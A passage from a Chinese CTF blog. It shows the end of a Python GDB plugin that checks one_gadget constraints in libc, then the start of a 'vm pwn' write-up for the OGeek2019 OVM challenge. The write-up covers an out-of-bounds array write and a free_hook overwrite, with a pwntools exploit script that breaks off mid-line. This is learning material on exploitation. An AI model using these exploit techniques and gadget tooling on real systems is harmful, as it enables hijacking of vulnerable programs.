class="built_in">len</span>(result)==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">        result=result[<span class="number">0</span>]</span><br><span class="line">        register=result[<span class="number">0</span>]</span><br><span class="line">        operator=result[<span class="number">1</span>]</span><br><span class="line">        operand=result[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            calc_value=<span class="built_in">int</span>(get_register_value(register))-<span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            calc_value=<span class="built_in">int</span>(get_register_value(register))+<span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> get_address_permissions(calc_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result)==<span class="number">3</span>:</span><br><span class="line">        register_value=get_register_value(result)</span><br><span class="line">        <span class="keyword">if</span> register_value==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> get_address_permissions(register_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register_value_ptr</span>(<span class="params">register</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数作用获取寄存器所指向的值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    register(str):被访问的寄存器名称</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (int):如果寄存器值为0或者寄存器的值为非法地址则返回-1  否则返回寄存器所指向的值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    address = gdb.parse_and_eval(<span class="string">&quot;$&quot;</span> + register)</span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            value = gdb.selected_inferior().read_memory(address, <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            value = gdb.selected_inferior().read_memory(address, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">int</span>.from_bytes(value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_A</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;rsp &amp; 0xf == 0&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register)) &amp; <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_B</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;rcx == NULL&quot;&quot;&quot;</span></span><br><span class="line">    register=condition_list[<span class="number">0</span>]</span><br><span class="line">    calc_value=<span class="built_in">int</span>(get_register_value(register))</span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_C</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;(u16)[rbp] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    condition=condition_list[<span class="number">0</span>]</span><br><span class="line">    register=condition_list[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> condition == <span class="string">&quot;u16&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value_ptr(register))</span><br><span class="line">        <span class="keyword">if</span> calc_value == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        calc_value=calc_value &amp; <span class="number">0xffff</span></span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_D</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[[rbp-0x70]] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=re.findall(<span class="string">r&quot;\[(\w+)([+-])(\w+)&quot;</span>, condition_list[<span class="number">0</span>])</span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        calc_value = <span class="built_in">int</span>(get_register_value(register)) - <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span> - <span class="built_in">int</span>(operand,<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        calc_value = <span class="built_in">int</span>(get_register_value(register)) + <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span> + <span class="built_in">int</span>(operand,<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">8</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">4</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">8</span>)</span><br><span class="line">            calc_value=<span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">4</span>)</span><br><span class="line">            calc_value=<span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_E</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[r10] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    register=condition_list[<span class="number">0</span>]</span><br><span class="line">    calc_value =get_register_value_ptr(register)</span><br><span class="line">    <span class="keyword">if</span> calc_value == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_F</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[esp+0x3c] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register) + <span class="built_in">int</span>(operand,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register) - <span class="built_in">int</span>(operand,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value,<span class="number">8</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value,<span class="number">4</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">equal_judgement</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数来处理 one_gadget 中的等式判断，我目前发现 one_gadget中的等式一共有六种类型（如下）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;rsp &amp; 0xf == 0&quot;,</span></span><br><span class="line"><span class="string">    &quot;rcx == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;(u16)[rbp] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[[rbp-0x70]] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[r10] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[esp+0x3c] == NULL&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    我通过正则表达式来识别出这六种情况，并将他们的关键信息匹配出来，再调用其对应的处理函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    string(str): 等式判断条件的字符串，例如 &quot;[esp+0x34] == NULL&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (bool): 如果等式成立则返回 True 不成立则返回 False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    judgement=[]</span><br><span class="line">    <span class="keyword">match</span>=[]</span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;(\w+)\s*(\&amp;)\s*(\w+)&quot;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_A(judgement)</span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&#x27;\((\w+)\)\[(\w+)\]&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_C(judgement)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&#x27;\[(.*?)\]&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(judgement[<span class="number">0</span>].split(<span class="string">&#x27;[&#x27;</span>)) &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> condition_equal_D(judgement)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">match</span> = re.findall(<span class="string">r&#x27;(\w+)\s*([+-])\s*(.*)&#x27;</span>, judgement[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                <span class="keyword">return</span> condition_equal_F(<span class="keyword">match</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;(\w+) == NULL&quot;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_B(judgement)</span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;\[(\w+)\] == NULL&quot;</span>,string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_E(judgement)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">constraints</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数作用是将传入的每一组 one_gadget 按照条件进行分类，然后调用更具体的函数进行处理</span></span><br><span class="line"><span class="string">    目前我考虑了 one_gadget 的三种情况，分别是 is writeable 和 is got address of libc 以及对等式的判断</span></span><br><span class="line"><span class="string">    如果使用 l2 参数的话，会有更多的情况，我认为它们概率极小并且条件过于繁多，所以目前没有对它们进行判断</span></span><br><span class="line"><span class="string">    如果之后有条件没有考虑到需要添加的，或者想处理 l2 的 one_gadget 则在这里添加新的函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    constraints(list):存储的是一组的 one_gadget 所有信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">    (bool)如果当前这组 one_gadget 的所有条件都成立返回 True 反之有一个条件没有满足就返回 False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    result1 = []</span><br><span class="line">    <span class="keyword">for</span> constraint <span class="keyword">in</span> constraints:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is writable&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(is_writeable_check(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is the GOT address of libc&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(is_got_address_of_libc(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;||&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> constraint.split(<span class="string">&#x27;||&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;== 0&quot;</span> <span class="keyword">in</span> i <span class="keyword">or</span> <span class="string">&quot;== NULL&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                    result1.append(equal_judgement(i))</span><br><span class="line">            result.append(<span class="built_in">any</span>(result1))</span><br><span class="line">            result1 = []</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;== 0&quot;</span> <span class="keyword">in</span> constraint <span class="keyword">or</span> <span class="string">&quot;== NULL&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(equal_judgement(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;one_gadget---&gt;&#x27;</span>, result, constraints)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_gadget_cmd</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数为 check_gadget 命令的主函数</span></span><br><span class="line"><span class="string">    该命令实现了对当前位置概率略高的 one_gadget 能否生效做了判断</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    命令使用方法：</span></span><br><span class="line"><span class="string">    如果你想判断劫持执行流的这个位置是否有 one_gadget 能够生效，那么使用 gdb 调试到劫持执行流的地址处</span></span><br><span class="line"><span class="string">    使用该命令就可以看到是否有 one_gadget 能用了</span></span><br><span class="line"><span class="string">    目前只能判断概率较高的 one_gadget 能否使用，无法对 -l2 显示出来的 one_gadget 进行判断</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    check_gadget_cmd() 函数无参且无返回值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    libc_path=get_libc_path()    </span><br><span class="line">    all_gadget_info=get_gadget_info(libc_path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(all_gadget_info)):</span><br><span class="line">        gadget_address,gadget_constraints=all_gadget_info[i][<span class="number">0</span>],all_gadget_info[i][<span class="number">1</span>]</span><br><span class="line">        result=check(gadget_constraints)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n\033[1;31m&quot;</span>+<span class="string">&quot;=&quot;</span>*<span class="number">120</span>+<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;Successful one_gadget&quot;</span>+<span class="string">&quot;\033[0m&quot;</span>,<span class="string">&quot;\033[1;31m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;gadget_address-------&gt;&quot;</span>+<span class="string">&quot;\033[0m\t\t&quot;</span>,<span class="string">&quot;\033[1;32m&quot;</span>+gadget_address+<span class="string">&quot;\033[0m&quot;</span>,<span class="string">&quot;\033[1;31m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;gadget_info----------&gt;&quot;</span>+<span class="string">&quot;\033[0m\t\t&quot;</span>,<span class="string">&quot;\033[1;32m&quot;</span>+<span class="built_in">str</span>(gadget_constraints)+<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;=&quot;</span>*<span class="number">120</span>+<span class="string">&quot;\033[0m\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&quot;define check_gadget\n\tpython check_gadget_cmd()\nend&quot;</span>)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/ccd7886.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/ccd7886.html" class="post-title-link" itemprop="url">关于vm pwn的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:55:26" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>目前就做了两道vm pwn的题目先简单总结一下，这类题目逆向量较大，如果有分析不懂的函数或者某段指令可以尝试配合gdb动态调试观察某些寄存器或内存值的变化来猜测其功能。漏洞点大多为数组越界可以写或者任意读来劫持hook或者got表等等。不一定每个指令都要具体分析明白，个人认为去关注漏洞指令，其他指令用到哪个去简单分析哪个</p>
<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041849897.png" alt="image-20221204184926728"></p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041852544.png" alt="image-20221204185221474"></p>
<p>首先程序申请了一块堆空间，程序结束的时候可以往里面输入东西，然后将其释放掉。随后询问了PC和SP寄存器的值(所谓的寄存器就是在bss段上开辟的一片数组)，而pc和sp在这道题里没有任何用，接着要我们要输入指令的个数。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041923932.png" alt="image-20221204192348862"></p>
<p>上面代码的注释写的很清楚了，下面的代码在while循环里的部分是处理指令的部分，而最后read函数去往堆块里输入数据，再将这个堆块free掉</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041924716.png" alt="image-20221204192408661"></p>
<p>在execute函数里将我们输入的每个指令都进行了分析，大概就是用c语言来实现了汇编的指令，首先每个指令都是四字节，最高字节是一个操作码(这个操作码用if来判断，这个指令是干啥的)，然后另外三个字节是操作数，以add指令为例，首先用HIBYTE这个宏判断最高字节是否为0x70，如果是0x70就执行</p>
<p><code>reg[high]=reg[low]+reg[medium]</code>很明显这是个add指令。通过reg数组以及配合其索引来进行的操作，索引就是指令的各个字节。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041944999.png" alt="image-20221204194431944"></p>
<p>下面这个指令是将具体的数值赋值给reg数组里的某个元素，只有赋值完毕，上面的add指令才有用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042032767.png" alt="image-20221204203212704"></p>
<p>而本题的漏洞则在下面两个指令</p>
<p>reg[low]的值可以控制，这意味着memory的索引可以溢出，从而去篡改某些指针。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033519.png" alt="image-20221204203332481"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033212.png" alt="image-20221204203341172"></p>
<p>因为无法篡改got表，所以把利用点放到程序最后往comment的输入上(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042035714.png" alt="image-20221204203553678"></p>
<p>如果我们能篡改comment这个指针的话，就意味着程序的最后可以任意地址写，并且还调用了free函数，那就利用数组溢出将comment改成free_hook-8的地址，最后输入字符串&#x2F;bin&#x2F;sh以及system的地址过去，执行free函数的时候则获取shell。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先我们要把free_hook-8的地址写到一个地址上，然后将这个地址利用数组溢出写到comment上。而第一步我们需要做出来一个free_hook-8的地址，考虑到bss段上方是got表，我们利用负数索引就可以实现地址任意读取，这里我读取的是stderr的地址，将其读到了reg[4][5]的位置(因为地址是八字节，而一个数组元素是四字节，所以需要两个数组元素放一个地址)</p>
<p>而后用add指令将stderr的地址改成free_hook-8，最后将free_hook-8赋值到comment的位置即可。具体情况参考exp</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26005&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;PC: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;SP: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;CODE SIZE: &quot;</span>,<span class="built_in">str</span>(<span class="number">18</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">op,high,medium,low</span>):</span><br><span class="line">    payload=(op&lt;&lt;<span class="number">24</span>)+(high&lt;&lt;<span class="number">16</span>)+(medium&lt;&lt;<span class="number">8</span>)+(low)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;CODE: &quot;</span>)</span><br><span class="line"><span class="comment">#create a stderr address in reg array</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>)     <span class="comment">#mov reg[0],26</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[4],memory[reg[2]]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">25</span>)     <span class="comment">#mov reg[0],25</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[5],memory[reg[2]]       reg[4][5]---&gt;stderr address</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#create free_hook address through stderr address</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span 